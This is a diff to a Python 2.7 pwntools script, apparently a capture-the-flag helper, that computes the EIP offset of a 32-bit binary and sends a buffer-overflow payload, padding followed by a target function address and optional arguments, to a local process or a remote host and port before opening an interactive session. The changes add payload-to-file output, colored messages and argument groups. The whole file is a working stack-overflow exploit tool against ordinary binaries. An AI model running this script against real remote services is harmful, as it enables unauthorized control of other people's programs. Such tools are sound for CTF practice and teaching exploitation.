@@ -1,4 +1,5 @@
 #!/usr/bin/python2.7
+# coding=utf-8
 
 #
 # Script that uses pwntool to do one of the followings:
@@ -20,13 +21,12 @@
 #   python2.7 pwn-script.py -r <hostname/IP> -p <port> -O 188
 #
 
-# TODO: aggiusta gli arguments in input usando "PARENTS" option invece degli IF annidati
-# TODO: da sistemare gli arguments in input con dei nomi più significativi (METAVAL?) per i valori dei flag specificati nell'help (e.s. -o FILE PATH)
 # TODO: sposta s_addr, r_addr, etc. come input parameters invece di hardcoded
 
 from pwn import *
 import sys
 import argparse
+from termcolor import colored
 
 # ============= EDIT THIS VALUES BEFORE RUNNING  ============= #
 s_addr = 0x80491e2      # Required
@@ -35,8 +35,6 @@ a1_addr = 0xdeadbeef    # Optional
 a2_addr = 0xc0ded00d    # Optional
 # ============ ============ ============ ============ ======== #
 
-# Set DEBUG mode for verbose output
-#context.log_level =  "DEBUG"
 
 def get_offset(binary):
     context.binary = binary 
@@ -58,7 +56,7 @@ def get_offset(binary):
 def get_payload(offset):
     payload = ''
     payload += 'A'*offset   # fills the memory till the EIP
-    payload += p32(s_addr)  # addr of the funciont to execute (that will override EIP)
+    payload += p32(s_addr)  # addr of the function to execute (that will override EIP)
     if r_addr is not None:
         payload += p32(r_addr)  # return addr
     if a1_addr is not None:
@@ -69,7 +67,7 @@ def get_payload(offset):
 
     return payload
 
-def exploit(scope, offset, target, port):
+def exploit(scope, offset, target, port, verbose, progr):
     if scope == "l":
         context.binary = target 
         conn = process(context.binary.path)
@@ -77,6 +75,15 @@ def exploit(scope, offset, target, port):
         conn =  remote(target, port)
 
     payload = get_payload(offset)
+    
+    if verbose:
+        # Print payload to a file
+        fname="pwn.bin"
+        f = open(fname, 'wb')
+        f.write(payload)
+        f.close()
+        print "[{}] > Payload written to {}".format(progr,fname) 
+
     conn.recvuntil(': \n')
     conn.sendline(payload)
     conn.interactive()
@@ -84,61 +91,65 @@ def exploit(scope, offset, target, port):
 
 if __name__ == '__main__':
 
+    # Set DEBUG mode for verbose output
+    #context.log_level =  "DEBUG"
+
     # Parse command line arguments
     parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    parser.add_argument("-o", "--compute-offset", required=False, help="Compute the EIP (Instruction Pointer) of a local binary file")
-    parser.add_argument("-O", "--given-offset", type=int, required=False, help="Specify the offset for the EIP (Instraction Pointer)")
-    parser.add_argument("-b", "--binary", required=False, help="Relative path to local binary file to analyse")
-    parser.add_argument("-l", "--exploit-locally", required=False, help="Exploit a local binary. Requires s_addr varible set")
-    parser.add_argument("-r", "--exploit-remotely", required=False, help="Exploit a remote hostname/IP. Requires -p/--port and -O/--given-offse set")
+    main_grp = parser.add_mutually_exclusive_group(required=True)
+    main_grp.add_argument("-o", "--compute-offset", metavar="BINARY FILE", required=False, help="Compute the EIP (Instruction Pointer) offset of a local binary file")
+    main_grp.add_argument("-l", "--exploit-locally", metavar="BINARY FILE", required=False, help="Exploit a local binary. Requires s_addr varible set")
+    main_grp.add_argument("-r", "--exploit-remotely", metavar="HOSTNAME", required=False, help="Exploit a remote hostname/IP. Requires -p/--port and -O/--given-offse set")
     parser.add_argument("-p", "--port", type = int, required=False, help="Port of the remote host to exploit") # nargs='?', nargs = '+'
+    parser.add_argument("-O", "--given-offset", metavar="OFFSET", type=int, required=False, help="Specify the offset for the EIP (Instraction Pointer)")
+    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="Verbose output (i.e., write payload in a file)")
     args = parser.parse_args()
+    progr = colored(sys.argv[0], 'yellow')
 
     # ==== -r ==== #
     if args.exploit_remotely is not None:
         # ==== -p ==== #
         if args.port is None:
-            print "[{}] > Error: remote port not specified. Use the -p/--port option to specify the port of the remote host to exploit.".format(sys.argv[0]) 
+            print "[{}] > Error: remote port not specified. Use the -p/--port option to specify the port of the remote host to exploit.".format(progr) 
             sys.exit(1)
         # ==== -O ==== #
         if args.given_offset is None:
-            print "[{}] > Error: EIP offset not specified. Use the -O/--given-offset option to specify the EIP offset.".format(sys.argv[0]) 
+            print "[{}] > Error: EIP offset not specified. Use the -O/--given-offset option to specify the EIP offset.".format(progr) 
             sys.exit(1)
 
-        print "[{}] > Exploiting the remote host '{}:{}' at the EIP offset '{}'".format(sys.argv[0], args.exploit_remotely, args.port, args.given_offset)
-        exploit("r", args.given_offset, args.exploit_remotely, args.port)
+        print "[{}] > Exploiting the remote host '{}:{}' at the EIP offset '{}'".format(progr, args.exploit_remotely, args.port, args.given_offset)
+        exploit("r", args.given_offset, args.exploit_remotely, args.port, args.verbose, progr)
         sys.exit(0)
 
     # ==== -l ==== #
     if args.exploit_locally is not None:
         # Check if file exists
         if not os.path.isfile(args.exploit_locally):
-            print "[{}] > Error: file '{}' not found.".format(sys.argv[0], args.exploit_locally)
+            print "[{}] > Error: file '{}' not found.".format(progr, args.exploit_locally)
             sys.exit(1)
         file_path = os.path.abspath(args.exploit_locally)
-        print "[{}] > File '{}' located.".format(sys.argv[0], file_path)
+        print "[{}] > File '{}' located.".format(progr, file_path)
 
         # ==== -O ==== #
         if args.given_offset is None:
             # Compute offset since not given
-            print "[{}] > Computing the EIP offset...".format(sys.argv[0])
+            print "[{}] > Computing the EIP offset...".format(progr)
             off = get_offset(file_path)
         else:
             off = args.given_offset
 
-        print "[{}] > Exploiting the local file '{}' at the EIP offset '{}'".format(sys.argv[0], file_path, off)
-        exploit("l", off, file_path, None)
+        print "[{}] > Exploiting the local file '{}' at the EIP offset '{}'".format(progr, file_path, off)
+        exploit("l", off, file_path, None, args.verbose, progr)
         sys.exit(0)
 
     # ==== -o ==== #
     if args.compute_offset is not None:
         # Check if file exists
         if not os.path.isfile(args.compute_offset):
-            print "[{}] > Error: file '{}' not found.".format(sys.argv[0], args.compute_offset)
+            print "[{}] > Error: file '{}' not found.".format(progr, args.compute_offset)
             sys.exit(1)
         file_path = os.path.abspath(args.compute_offset)
-        print "[{}] > File '{}' located.".format(sys.argv[0], file_path)
-        print "[{}] > Computing the EIP offset...".format(sys.argv[0])
+        print "[{}] > File '{}' located.".format(progr, file_path)
+        print "[{}] > Computing the EIP offset...".format(progr)
         off = get_offset(file_path)
         sys.exit(0)
-
